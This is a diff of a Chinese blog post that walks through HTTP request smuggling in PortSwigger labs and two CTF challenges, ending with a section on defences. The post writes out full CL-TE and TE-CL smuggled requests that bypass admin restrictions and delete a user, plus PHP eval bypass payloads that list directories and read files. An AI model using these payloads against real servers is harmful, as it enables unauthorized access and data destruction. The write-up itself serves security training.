 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure>
-<p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" srcset="/img/loading.gif" lazyload alt="1"><br>连续两次发出以下请求：</p>
+<p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>连续两次发出以下请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure>
-<p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" srcset="/img/loading.gif" lazyload alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p>
+<p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure>
 <p>现在可以访问管理面板</p>
-<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" srcset="/img/loading.gif" lazyload alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p>
+<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure>
-<p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" srcset="/img/loading.gif" lazyload alt="5"></p>
-<h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" srcset="/img/loading.gif" lazyload alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p>
+<p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p>
+<h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure>
-<p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" srcset="/img/loading.gif" lazyload alt="1"><br>两次发出以下请求：</p>
+<p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>两次发出以下请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure>
-<p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" srcset="/img/loading.gif" lazyload alt="2"><br>更改走私的请求URL以删除用户carlos：</p>
+<p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>更改走私的请求URL以删除用户carlos：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure>
 <p>访问管理员页面验证是否删除</p>
-<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p>
 <h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>HGAME2021-宝藏走私者</strong></p>
-<p>hint: 注意留意服务器信息<br>资料：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>hint: 注意留意服务器信息<br>资料：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>点击超链接跳转到/secret，发现响应包中提示需要<code>client-ip</code>头</p>
-<p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>将client-ip改为127.0.0.1，发现还是不行，猜测是反代会将真实ip带到后面，抓包看到服务器是ATS/7.1.2，反代服务器本版存在HTTP Smuggling CL-TE 漏洞，可以利用HTTP请求走私</p>
 <p>构造请求包：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure>
 <p>由于没有赛后复现没有环境，贴一张其他大师傅的wp</p>
-<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" srcset="/img/loading.gif" lazyload alt="image-20210502225618544"></p>
-<p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" srcset="/img/loading.gif" lazyload alt="题目"><br>calc.php代码</p>
+<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" alt="image-20210502225618544"></p>
+<p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="题目"><br>calc.php代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p>
-<p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" srcset="/img/loading.gif" lazyload alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" srcset="/img/loading.gif" lazyload alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" srcset="/img/loading.gif" lazyload alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" srcset="/img/loading.gif" lazyload alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" srcset="/img/loading.gif" lazyload alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" srcset="/img/loading.gif" lazyload alt="cl-te"></p>
+<p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p>
 <h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p>
 <ul>
 <li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li>
@@ -370,277 +195,277 @@
 </ul>
 <p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p>
 <p>参考文章：<br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://swhat.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">USB流量分析</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"><span class="paginator-prev__text">HTTP协议</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Content-Length"><span class="toc-number">3.1.</span> <span class="toc-text">Content-Length</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Transfer-Encoding"><span class="toc-number">3.2.</span> <span class="toc-text">Transfer-Encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL%E4%B8%8ETE%E8%A7%A3%E6%9E%90%E4%BC%98%E5%85%88%E7%BA%A7%E9%A1%BA%E5%BA%8F"><span class="toc-number">3.3.</span> <span class="toc-text">CL与TE解析优先级顺序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">请求走私分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CL%E4%B8%8D%E4%B8%BA0"><span class="toc-number">4.1.</span> <span class="toc-text">CL不为0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-CL%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">CL-CL漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">CL-TE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text">TE-TE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.5.</span> <span class="toc-text">TE-CL漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">绕过前端服务器安全控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CL-TE%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">利用CL-TE漏洞绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TE-CL%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.</span> <span class="toc-text">利用TE-CL漏洞绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">6.</span> <span class="toc-text">CTF中的请求走私</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">漏洞防御</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/2.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Atkx</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/swhat" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">22</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/WEB/">WEB</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">USB流量分析</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/">
-                        <span class="hidden-mobile">HTTP协议</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
 
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
 
-      </div>
-    
-  </div>
-</div>
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
 
-<!-- Custom -->
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
